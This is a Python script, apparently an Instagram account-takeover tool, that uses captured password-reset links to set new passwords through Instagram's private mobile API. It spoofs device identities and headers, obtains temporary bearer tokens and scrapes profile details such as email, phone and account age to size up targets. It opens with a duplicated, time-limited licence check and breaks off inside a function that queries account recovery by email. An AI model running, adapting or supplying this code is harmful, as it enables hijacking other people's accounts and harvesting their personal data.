import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import datetime;now = datetime.date.today();import webbrowser;webbrowser.open('');target = datetime.date(2026,11,29)
if now >=target:exit("\x1b[1;92m/ عذراً عزيزي المستخدم انتهـت الفتـره المجانـية \n  @iiaii اذا كنت تـرغب بالاشتـراك علـيك التواصل مع المطور \n/ كـل الحـب وتقـدير يتمنـاها لكـم ( sayo )")
import os, sys



import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import datetime;now = datetime.date.today();import webbrowser;webbrowser.open('');target = datetime.date(2026,9,29)
if now >=target:exit("\x1b[1;92m/ عذراً عزيزي المستخدم انتهـت الفتـره المجانـية \n  @iiaii اذا كنت تـرغب بالاشتـراك علـيك التواصل مع المطور \n/ كـل الحـب وتقـدير يتمنـاها لكـم ( sayo )")
import os, sys



import requests
import json
import uuid
import random
import re
import time
import hashlib
import base64
import hmac
import string
from typing import Optional, Tuple
import os
import threading
from time import sleep
import httpx
import websocket
import datetime
import sys
from urllib.parse import urlparse, parse_qs

def generate_device_info():
    devices = [
        {
            'android': '35/15',
            'dpi': '420dpi',
            'res': '1080x2400',
            'brand': 'samsung',
            'model': 'SM-G991U',
            'cpu': 'qcom',
            'codename': 'o1q'
        },
        {
            'android': '35/15',
            'dpi': '480dpi',
            'res': '1080x2400',
            'brand': 'samsung',
            'model': 'SM-G998B',
            'cpu': 'qcom',
            'codename': 'p3s'
        },
        {
            'android': '35/15',
            'dpi': '440dpi',
            'res': '1080x2400',
            'brand': 'google',
            'model': 'Pixel-7',
            'cpu': 'google',
            'codename': 'panther'
        },
        {
            'android': '34/14',
            'dpi': '420dpi',
            'res': '1080x2340',
            'brand': 'oneplus',
            'model': 'ONEPLUS-A6013',
            'cpu': 'qcom',
            'codename': 'enchilada'
        }
    ]
    
    device = random.choice(devices)
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    IG_DEVICE_ID = str(uuid.uuid4())
    FAMILY_DEVICE_ID = str(uuid.uuid4())
    CONN_UUID = ''.join(random.choices(string.hexdigits.lower(), k=32))
    
    return {
        'android_id': ANDROID_ID,
        'ig_device_id': IG_DEVICE_ID,
        'family_device_id': FAMILY_DEVICE_ID,
        'conn_uuid': CONN_UUID,
        'device': device
    }

def reset_password_old(reset_url, new_password):
    try:
        psw = new_password
        s_k = f"#PWD_INSTAGRAM:0:{int(datetime.datetime.now().timestamp())}:{psw}"
        
        parsed = urlparse(reset_url)
        params = parse_qs(parsed.query)
        uidb36 = params.get('uidb36', [None])[0]
        token = params.get('token', [None])[0]
        version = params.get('v', ['367.0.0.43.91'])[0]
        
        if not uidb36 or not token:
            return False
        
        device_info = generate_device_info()
        device = device_info['device']
        
        DEVICE_ID = device_info['android_id']
        IG_DEVICE_ID = device_info['ig_device_id']
        FAMILY_DEVICE_ID = device_info['family_device_id']
        CONN_UUID = device_info['conn_uuid']
        
        WATERFALL_ID = str(uuid.uuid4())
        SESSION_ID = f"nid={''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/', k=11))};nc=1;fc=1;bc=0;"
        SESSION_PRIVATE = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))
        
        now = time.time()
        PIGEON_TIME = f"{now}.{random.randint(100, 999)}"
        NAV_TIME = str(now)
        
        USER_AGENT = f"Instagram {version} Android ({device['android']}; {device['dpi']}; {device['res']}; {device['brand']}; {device['model']}; {device['codename']}; {device['cpu']}; en_US; {random.randint(300000000, 399999999)})"
        
        url1 = "https://i.instagram.com/api/v1/accounts/password_reset/"
        payload1 = {
            'source': "one_click_login_email",
            'uidb36': uidb36,
            'device_id': DEVICE_ID,
            'token': token,
            'waterfall_id': WATERFALL_ID,
            'guid': str(uuid.uuid4()),
            'phone_id': str(uuid.uuid4()),
            '_uuid': str(uuid.uuid4()),
            '_csrftoken': "missing",
        }
        headers1 = {
            'User-Agent': USER_AGENT,
            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
            'accept-language': "en-US",
            'ig-intended-user-id': "0",
            'priority': "u=3",
            'x-bloks-is-layout-rtl': "false",
            'x-bloks-prism-ax-base-colors-enabled': "false",
            'x-bloks-prism-button-version': "CONTROL",
            'x-bloks-prism-colors-enabled': "true",
            'x-bloks-prism-font-enabled': "false",
            'x-bloks-prism-indigo-link-version': "0",
            'x-bloks-version-id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            'x-fb-client-ip': "True",
            'x-fb-connection-type': "WIFI",
            'x-fb-friendly-name': "IgApi: accounts/password_reset/",
            'x-fb-network-properties': "VPN;Metered;Validated;LocalAddrs=/10.1.10.1,;",
            'x-fb-request-analytics-tags': '{"network_tags":{"product":"567067343352427","purpose":"fetch","surface":"undefined","request_category":"api","retry_attempt":"0"}}',
            'x-fb-server-cluster': "True",
            'x-ig-android-id': DEVICE_ID,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_US",
            'x-ig-bandwidth-speed-kbps': str(random.randint(500, 1500)) + ".000",
            'x-ig-bandwidth-totalbytes-b': "0",
            'x-ig-bandwidth-totaltime-ms': "0",
            'x-ig-client-endpoint': "MainFeedFragment:feed_timeline",
            'x-ig-capabilities': "3brTv10=",
            'x-ig-connection-type': "WIFI",
            'x-ig-device-id': IG_DEVICE_ID,
            'x-ig-device-locale': "en_US",
            'x-ig-family-device-id': FAMILY_DEVICE_ID,
            'x-ig-mapped-locale': "en_US",
            'x-ig-nav-chain': f"MainFeedFragment:feed_timeline:1:cold_start:{NAV_TIME}:::",
            'x-ig-timezone-offset': "10800",
            'x-ig-www-claim': "0",
            'x-pigeon-rawclienttime': PIGEON_TIME,
            'x-tigon-is-retry': "False",
            'x-fb-conn-uuid-client': CONN_UUID,
            'x-fb-http-engine': "MNS/TCP",
            'x-fb-rmd': "state=URL_ELIGIBLE",
            'x-fb-session-id': SESSION_ID,
            'x-fb-session-private': SESSION_PRIVATE
        }
        
        r1 = requests.post(url1, data=payload1, headers=headers1)
        if r1.status_code != 200:
            return False
            
        X_MID = r1.headers.get("Ig-Set-X-Mid", "")
        if not X_MID:
            X_MID = "akgbYAABAAE3EXSBA1-tzpej_vXb"
        
        j1 = r1.json()
        user_id = j1.get('user_id', '')
        challenge_context = j1.get('challenge_context', '')
        if not user_id:
            return False
        
        url2 = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.ig.challenge.redirect.async/"
        payload2 = {
            'user_id': user_id,
            'cni': "0",
            'nonce_code': "",
            'bk_client_context': '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            'challenge_context': challenge_context,
            'bloks_versioning_id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            'get_challenge': "true"
        }
        headers2 = headers1.copy()
        headers2.update({
            'x-mid': X_MID,
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.ig.challenge.redirect.async/",
            'x-ig-nav-chain': f"MainFeedFragment:feed_timeline:1:cold_start:{time.time()}:::",
            'x-pigeon-rawclienttime': f"{time.time()}.{random.randint(100, 999)}",
            'x-bloks-version-id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"
        })
        
        r2 = requests.post(url2, data=payload2, headers=headers2)
        if r2.status_code != 200:
            return False
        
        new_mid = r2.headers.get("Ig-Set-X-Mid", "")
        if new_mid:
            X_MID = new_mid
        
        context_data = ""
        try:
            j2 = r2.json()
            ft = j2['layout']['bloks_payload']['ft']
            for key, value in ft.items():
                if 'context_data' in value and 'Q-PTBA' in value:
                    match = re.search(r'(Q-PTBA[^"]+?\|appr)', value)
                    if match:
                        context_data = match.group(1)
                        break
            if not context_data:
                match = re.search(r'(Q-PTBA[^"]+?\|appr)', r2.text)
                if match:
                    context_data = match.group(1)
        except:
            match = re.search(r'(Q-PTBA[^"]+?\|appr)', r2.text)
            if match:
                context_data = match.group(1)
        
        if not context_data:
            return False
        
        url3 = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.ap.last_resort_recovery.reset_password.async/"
        params_data = {
            "client_input_params": {
                "password": s_k,
                "aac": ""
            },
            "server_params": {
                "context_data": context_data,
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "INTERNAL__latency_qpl_instance_id": random.randint(100000000000000, 999999999999999)
            }
        }
        payload3 = {
            'params': json.dumps(params_data),
            'bk_client_context': '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            'bloks_versioning_id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"
        }
        headers3 = headers1.copy()
        headers3.update({
            'x-mid': X_MID,
            'accept-language': "en-US",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.ap.last_resort_recovery.reset_password.async/",
            'x-ig-bandwidth-speed-kbps': str(random.randint(1000, 2000)) + ".000",
            'x-ig-bandwidth-totalbytes-b': str(random.randint(200000, 500000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(200, 400)),
            'x-ig-client-endpoint': "com.bloks.www.ap.last_resort_recovery.reset_password",
            'x-ig-nav-chain': f"MainFeedFragment:feed_timeline:1:cold_start:{time.time()}:::,com.bloks.www.ap.last_resort_recovery.reset_password:com.bloks.www.ap.last_resort_recovery.reset_password:2:warm_start:{time.time()}:::",
            'x-pigeon-rawclienttime': f"{time.time()}.{random.randint(100, 999)}",
            'x-pigeon-session-id': f"UFS-{str(uuid.uuid4())}-1",
            'x-bloks-version-id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"
        })
        
        r3 = requests.post(url3, data=payload3, headers=headers3)
        
        if r3.status_code == 200:
            if "has_whatsapp_installed" in r3.text or "BLOKS AUTH PLATFORM RESET PASSWORD" in r3.text:
                return True
            try:
                j3 = r3.json()
                if j3.get('status') == 'ok':
                    return True
            except:
                pass
            return True
        return False
        
    except:
        return False

def extract_uid_token(reset_url: str) -> Tuple[Optional[str], Optional[str]]:
    uid_match = re.search(r'uidb36=([^&]+)', reset_url)
    token_match = re.search(r'token=([^&:]+)', reset_url)
    uid = uid_match.group(1) if uid_match else None
    token = token_match.group(1) if token_match else None
    if not uid or not token:
        raise ValueError("not found uidb36 or token")
    return uid, token

def encrypt_password(password: str, device_id: str) -> str:
    time_now = int(time.time())
    salt = (device_id * 4).encode('utf-8')
    iterations = 1000
    derived_key = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, iterations, dklen=32)
    hash_b64 = base64.b64encode(derived_key).decode('utf-8')
    return f"#PWD_INSTAGRAM:4:{time_now}:{hash_b64}"

def generate_headers(device_id: str, family_device_id: str, guid: str, csrf_token: Optional[str] = None) -> dict:
    user_agent = (
        f"Instagram 438.0.0.28.88 Android ("
        f"{random.choice(['14/34', '15/35'])}; 500dpi; 1440x3120; "
        f"samsung; SM-S928B; e3q; qcom; ar_YE; {random.randint(560000000, 580000000)})"
    )
    headers = {
        'Host': 'i.instagram.com',
        'User-Agent': user_agent,
        'Accept-Language': 'ar-YE, en-US',
        'X-IG-App-ID': '567067343352427',
        'X-IG-App-Locale': 'ar_YE',
        'X-IG-Device-ID': str(uuid.uuid4()),
        'X-IG-Device-Locale': 'ar_YE',
        'X-IG-Family-Device-ID': family_device_id,
        'X-IG-Android-ID': device_id,
        'X-IG-Connection-Type': 'WIFI',
        'X-FB-Connection-Type': 'WIFI',
        'X-IG-TimeZone-Offset': '10800',
        'X-IG-WWW-Claim': '0',
        'X-MID': f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))}{random.randint(10, 99)}gABAAG{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_', k=20))}",
        'X-Tigon-Is-Retry': 'False',
        'Content-Type': 'application/json',
    }
    if csrf_token:
        headers['X-CSRFToken'] = csrf_token
    return headers

def reset_instagram_password_new(reset_url: str, new_password: str) -> bool:
    try:
        uid, token = extract_uid_token(reset_url)
        print(f"[+] UID: {uid}")
        print(f"[+] Token: {token}")

        device_id = f"android-{''.join(random.choices('0123456789abcdef', k=16))}"
        family_device_id = str(uuid.uuid4())
        guid = str(uuid.uuid4())
        session = requests.Session()
        csrf_token = None

        payload1 = {
            "params": {
                "client_input_params": {
                    "aac": "",
                    "lois_settings": {"lois_token": ""},
                    "cloud_trust_token": None,
                    "zero_balance_state": "",
                    "network_bssid": None
                },
                "server_params": {
                    "is_from_logged_out": 0,
                    "layered_homepage_experiment_group": None,
                    "has_seen_aart_on": 0,
                    "device_id": device_id,
                    "login_surface": "unknown",
                    "waterfall_id": str(uuid.uuid4()),
                    "INTERNAL__latency_qpl_instance_id": random.randint(10**13, 10**14),
                    "source": "one_click_login_email",
                    "token": token,
                    "is_platform_login": 0,
                    "uid": uid,
                    "att_permission_status": 0,
                    "INTERNAL__latency_qpl_marker_id": random.randint(10**7, 10**8),
                    "family_device_id": family_device_id,
                    "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                    "is_bypass_login": 0,
                    "guid": guid,
                    "access_flow_version": "pre_mt_behavior",
                    "auto_send": 0,
                    "is_ig_account_deletion_reactivation_login": 0,
                    "is_from_password_reset": 1,
                    "is_from_logged_in_switcher": 0,
                    "phone_id": family_device_id,
                    "qe_device_id": guid
                }
            },
            "bk_client_context": {
                "bloks_version": "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79",
                "styles_id": "instagram",
                "theme_params": [{"value": ["three_neutral_gray"], "design_system_name": "XMDS"}]
            },
            "bloks_versioning_id": "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79"
        }

        headers = generate_headers(device_id, family_device_id, guid, csrf_token)
        print("[*] Sending OCL request...")
        resp1 = session.post(
            "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.bloks.caa.login.async.send_ocl_login_request/",
            json=payload1,
            headers=headers
        )
        resp1.raise_for_status()
        if 'csrftoken' in session.cookies:
            csrf_token = session.cookies['csrftoken']
            headers['X-CSRFToken'] = csrf_token

        auth_header = resp1.headers.get('IG-Set-Authorization', '')
        match = re.search(r'IGT:\d+:([A-Za-z0-9+/=_-]+)', auth_header)
        if not match:
            raise Exception("not found temporary token")
        access_token = match.group(1)
        print(f"[+] Temporary token: {access_token}")
        headers['Authorization'] = f"Bearer IGT:2:{access_token}"

        payload2 = {
            "method": "post",
            "format": "json",
            "server_timestamps": "true",
            "locale": "user",
            "fb_api_req_friendly_name": "QuickPromotionSurfaceQueryV3",
            "client_doc_id": "409250268987547102880100270",
            "enable_canonical_naming": "true",
            "enable_canonical_variable_overrides": "true",
            "enable_canonical_naming_ambiguous_type_prefixing": "true",
            "variables": {
                "trigger_context": {"context_data_tuples": []},
                "surface_triggers": [{"triggers": ["app_foreground", "session_start"], "surface_id": "INSTAGRAM_FOR_ANDROID_LOGIN_INTERSTITIAL_QP"}],
                "scale": 3,
                "bloks_version": "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79"
            }
        }
        print("[*] Fetching Quick Promotion data...")
        time.sleep(2)
        resp2 = session.post(
            "https://graph.instagram.com/graphql_www",
            json=payload2,
            headers=headers
        )
        resp2.raise_for_status()
        data2 = resp2.json()
        promotions = data2["data"]["1$ig_quick_promotion_batch_fetch_root(include_holdouts:true,is_from_igwww:true,supports_client_side_filters:true,surface_triggers:$surface_triggers,trigger_context:$trigger_context)"][0]["eligible_promotions"]["edges"]
        if not promotions:
            raise Exception("no promotions available")
        promo = promotions[0]["node"]
        qp_id = promo["promotion_id"]
        logging_data = json.loads(promo["logging_data"])
        nux_id = logging_data["nux_id"]
        device_id_qp = logging_data["device_id"]
        family_device_id_qp = logging_data["family_device_id"]
        qp_uuid = logging_data["uuid"]
        print(f"[*] QP ID: {qp_id}, Nux ID: {nux_id}")

        payload3 = {
            "params": {
                "client_input_params": {
                    "aac": "",
                    "lois_settings": {"lois_token": ""}
                },
                "server_params": {
                    "is_from_logged_out": 0,
                    "device_id": device_id_qp,
                    "qp_id": qp_id,
                    "INTERNAL_INFRA_screen_id": "wil6pv:1",
                    "serialized_qp_context": {
                        "nuxID": nux_id,
                        "deviceID": device_id_qp,
                        "familyDeviceID": family_device_id_qp
                    },
                    "access_flow_version": "pre_mt_behavior",
                    "is_platform_login": 0,
                    "is_from_qp": 1
                }
            },
            "_uuid": qp_uuid,
            "bk_client_context": {
                "bloks_version": "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79",
                "styles_id": "instagram",
                "theme_params": [{"value": ["three_neutral_gray"], "design_system_name": "XMDS"}]
            },
            "bloks_versioning_id": "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79"
        }
        print("[*] Getting context...")
        time.sleep(2)
        resp3 = session.post(
            "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.reset_password/",
            json=payload3,
            headers=headers
        )
        resp3.raise_for_status()
        text3 = resp3.text
        conx_match = re.search(r'"([A-Za-z0-9_\-]+\|arm)"', text3)
        if not conx_match:
            conx_match = re.search(r'context_data["\s]*:["\s]*"([^"]+)"', text3)
        if not conx_match:
            raise Exception("not found context")
        conx = conx_match.group(1)
        print(f"[+] Context: {conx}")

        encrypted_pw = encrypt_password(new_password, device_id)
        payload4 = {
            "params": {
                "client_input_params": {
                    "si_device_param_network_info": {
                        "active_subscriptions_info": [{
                            "network_type": 0,
                            "is_data_roaming": 0,
                            "is_esim": 0,
                            "is_gsm_roaming": 0,
                            "is_sim_sms_capable": None,
                            "is_mobile_data_enabled": 1,
                            "sim_carrier_id": -1,
                            "sim_carrier_id_name": None,
                            "sim_state": 5,
                            "sim_operator": "421002",
                            "sim_operator_name": "Android",
                            "signal_strength": 4,
                            "group_id_level_1": None,
                            "network_operator": "421002"
                        }],
                        "default_subscription_info": {
                            "network_type": 0,
                            "is_data_roaming": 0,
                            "is_esim": 0,
                            "is_gsm_roaming": 0,
                            "is_sim_sms_capable": None,
                            "is_mobile_data_enabled": 1,
                            "sim_carrier_id": -1,
                            "sim_carrier_id_name": None,
                            "sim_state": 5,
                            "sim_operator": "421002",
                            "sim_operator_name": "Android",
                            "signal_strength": 4,
                            "group_id_level_1": None,
                            "network_operator": "421002"
                        },
                        "is_airplane_mode": 0,
                        "is_active_network_cellular": 0,
                        "is_device_sms_capable": 1,
                        "sim_count": 1,
                        "is_wifi": 1
                    },
                    "ig_android_qe_device_id": guid,
                    "aac": "",
                    "device_id": device_id,
                    "enc_new_password": encrypted_pw,
                    "is_logout_all": 0,
                    "lois_settings": {"lois_token": ""},
                    "waterfall_id": str(uuid.uuid4()),
                    "cloud_trust_token": None,
                    "zero_balance_state": "",
                    "network_bssid": None,
                    "access_token_json": f"Bearer IGT:2:{access_token}"
                },
                "server_params": {
                    "event_request_id": str(uuid.uuid4()),
                    "is_from_logged_out": 0,
                    "text_input_id": "wilq5z:14",
                    "qp-id": int(qp_id),
                    "layered_homepage_experiment_group": None,
                    "device_id": device_id_qp,
                    "login_surface": "account_recovery",
                    "waterfall_id": None,
                    "INTERNAL__latency_qpl_instance_id": random.randint(10**13, 10**14),
                    "is_platform_login": 0,
                    "context_data": conx,
                    "login_entry_point": "account_recovery",
                    "INTERNAL__latency_qpl_marker_id": random.randint(10**7, 10**8),
                    "family_device_id": family_device_id_qp,
                    "offline_experiment_group": None,
                    "serialized_qp_context": {
                        "nuxID": int(nux_id),
                        "deviceID": device_id_qp,
                        "familyDeviceID": family_device_id_qp
                    },
                    "access_flow_version": "pre_mt_behavior",
                    "is_from_logged_in_switcher": 0
                }
            },
            "_uuid": qp_uuid,
            "bk_client_context": {
                "bloks_version": "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79",
                "styles_id": "instagram",
                "theme_params": [{"value": ["three_neutral_gray"], "design_system_name": "XMDS"}]
            },
            "bloks_versioning_id": "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79"
        }

        print("[*] Sending password change request...")
        time.sleep(2)
        resp4 = session.post(
            "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.reset_password_from_qp.async/",
            json=payload4,
            headers=headers
        )
        resp4.raise_for_status()

        if "CHANGE_PASSWORD" in resp4.text:
            print(f"[✓] Password changed successfully to: {new_password}")
            return True
        else:
            print("[✗] Failed to change password.")
            return False

    except Exception as e:
        print(f"[✗] Error during reset: {e}")
        return False

bi, hit, be, dead, gi, don = 0, 0, 0, 0, 0, 0
donr = 0
J = '\x1b[2;36m'
N = '\x1b[1;37m'

token = input("TOKEN :")
chid = input("ID :")

def get_instagram_info_api(username):
    url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.instagram.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "X-IG-App-ID": "936619743392459",
        "X-Requested-With": "XMLHttpRequest"
    }
    try:
        with httpx.Client(http2=True, headers=headers, timeout=10.0) as session:
            response = session.get(url)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user', {})
                followers = user.get('edge_followed_by', {}).get('count', 0)
                following = user.get('edge_follow', {}).get('count', 0)
                full_name = user.get('full_name', 'N/A')
                is_private = user.get('is_private', False)
                is_verified = user.get('is_verified', False)
                posts_count = user.get('edge_owner_to_timeline_media', {}).get('count', 0)
                user_id = user.get('id', '0')
                biography = user.get('biography', 'N/A')
                is_professional = user.get('is_professional_account', False)
                category = user.get('category_name', 'N/A')
                email = user.get('business_email') or user.get('public_email') or 'N/A'
                phone = user.get('business_phone_number') or user.get('public_phone_number') or 'N/A'
                external_url = user.get('external_url', 'N/A')
                profile_pic = user.get('profile_pic_url', 'N/A')
                return {
                    'success': True,
                    'followers': followers,
                    'following': following,
                    'full_name': full_name,
                    'is_private': is_private,
                    'is_verified': is_verified,
                    'posts_count': posts_count,
                    'user_id': user_id,
                    'biography': biography,
                    'is_professional': is_professional,
                    'category': category,
                    'email': email,
                    'phone': phone,
                    'external_url': external_url,
                    'profile_pic': profile_pic,
                    'username': user.get('username', username)
                }
            else:
                return {'success': False, 'error': f'HTTP {response.status_code}'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def get_account_creation_date(username):
    try:
        user_id = get_user_id_from_instagram(username)
        if user_id == '0':
            return None
        url = "https://www.instagram.com/graphql/query/"
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://www.instagram.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "X-IG-App-ID": "936619743392459",
            "X-Requested-With": "XMLHttpRequest"
        }
        variables = {"id": user_id, "first": 50}
        params = {
            "query_hash": "e769aa130647d2354c40ea6a439bfc08",
            "variables": json.dumps(variables)
        }
        response = requests.get(url, headers=headers, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            edges = data.get('data', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('edges', [])
            if edges:
                oldest_post = edges[-1].get('node', {})
                taken_at = oldest_post.get('taken_at_timestamp')
                if taken_at:
                    creation_date = datetime.datetime.fromtimestamp(taken_at)
                    return creation_date.year
        return None
    except Exception as e:
        print(f"Error getting creation date: {e}")
        return None

def get_user_id_from_instagram(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-IG-App-ID': '936619743392459'
        }
        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            user_id = data.get('data', {}).get('user', {}).get('id', '0')
            return user_id
        return '0'
    except:
        return '0'

def estimate_account_year(user_id, followers_count=0, posts_count=0):
    try:
        id_int = int(user_id)
        current_year = datetime.datetime.now().year
        if id_int < 1000000:
            base_year = 2010
        elif id_int < 10000000:
            base_year = 2011
        elif id_int < 100000000:
            base_year = 2012
        elif id_int < 500000000:
            base_year = 2013
        elif id_int < 1500000000:
            base_year = 2014
        elif id_int < 3000000000:
            base_year = 2015
        elif id_int < 5000000000:
            base_year = 2016
        elif id_int < 8000000000:
            base_year = 2017
        elif id_int < 12000000000:
            base_year = 2018
        elif id_int < 20000000000:
            base_year = 2019
        elif id_int < 30000000000:
            base_year = 2020
        elif id_int < 45000000000:
            base_year = 2021
        elif id_int < 65000000000:
            base_year = 2022
        elif id_int < 100000000000:
            base_year = 2023
        else:
            base_year = 2024
        if base_year > current_year:
            base_year = current_year
        if posts_count == 0:
            if base_year < current_year - 1:
                return current_year - 1
        elif posts_count < 5 and followers_count < 50:
            if base_year < current_year - 1:
                return current_year - 1
        return base_year
    except:
        return datetime.datetime.now().year

def get_followers_following(username):
    result = get_instagram_info_api(username)
    if result['success']:
        creation_year = get_account_creation_date(username)
        if creation_year:
            account_year = creation_year
        else:
            account_year = estimate_account_year(result['user_id'], result['followers'], result['posts_count'])
        return (
            result['followers'],
            result['following'],
            result['full_name'],
            result['is_private'],
            result['is_verified'],
            result['posts_count'],
            account_year,
            result
        )
    else:
        try:
            followers, following, full_name, is_private, is_verified, posts_count = get_user_info_from_instagram(username)
            user_id = get_user_id_from_instagram(username)
            account_year = estimate_account_year(user_id, followers, posts_count)
            return followers, following, full_name, is_private, is_verified, posts_count, account_year, None
        except:
            return 0, 0, 'N/A', False, False, 0, datetime.datetime.now().year, None

def get_user_info_from_instagram(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        url = f"https://www.instagram.com/{username}/"
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            content = response.text
            try:
                shared_data_match = re.search(r'window\._sharedData\s*=\s*({.*?});', content)
                if shared_data_match:
                    shared_data = json.loads(shared_data_match.group(1))
                    user_data = shared_data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {})
                    followers = user_data.get('edge_followed_by', {}).get('count', 0)
                    following = user_data.get('edge_follow', {}).get('count', 0)
                    full_name = user_data.get('full_name', '')
                    is_private = user_data.get('is_private', False)
                    is_verified = user_data.get('is_verified', False)
                    posts_count = user_data.get('edge_owner_to_timeline_media', {}).get('count', 0)
                    return followers, following, full_name, is_private, is_verified, posts_count
            except:
                pass
            followers_match = re.search(r'"edge_followed_by":\s*{"count":\s*(\d+)}', content)
            following_match = re.search(r'"edge_follow":\s*{"count":\s*(\d+)}', content)
            fullname_match = re.search(r'"full_name":"([^"]+)"', content)
            private_match = re.search(r'"is_private":(true|false)', content)
            verified_match = re.search(r'"is_verified":(true|false)', content)
            posts_match = re.search(r'"edge_owner_to_timeline_media":{"count":(\d+)}', content)
            followers = int(followers_match.group(1)) if followers_match else 0
            following = int(following_match.group(1)) if following_match else 0
            full_name = fullname_match.group(1) if fullname_match else ''
            is_private = private_match.group(1) == 'true' if private_match else False
            is_verified = verified_match.group(1) == 'true' if verified_match else False
            posts_count = int(posts_match.group(1)) if posts_match else 0
        return followers, following, full_name, is_private, is_verified, posts_count
    except Exception as e:
        return 0, 0, '', False, False, 0

def send(eml):
    global don
    session = requests.Session()
    android_id = generate_android_id()
    device_id = generate_device_id()
    family_device_id = generate_family_device_id()
    mid = generate_mid()
    user_agent = generate_user_agent()
    
    headers = {
        'User-Agent': f'{user_agent}',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'accept-language': 'en-US',
        'ig-intended-user-id': '0',
        'x-bloks-is-layout-rtl': 'false',
        'x-bloks-version-id': 'b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b',
        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id': android_id, 
        'x-ig-app-id': '567067343352427',
        'x-ig-app-locale': 'en_US',
        'x-ig-capabilities': '3brTv10=',
        'x-ig-connection-type': 'WIFI',
        'x-ig-device-id': device_id,  
        'x-ig-device-locale': 'ar_LY',
        'x-ig-family-device-id': family_device_id,  
        'x-ig-timezone-offset': '10800',
        'x-ig-www-claim': '0',
        'x-mid': mid,  
        'Connection': 'close',
    }
    
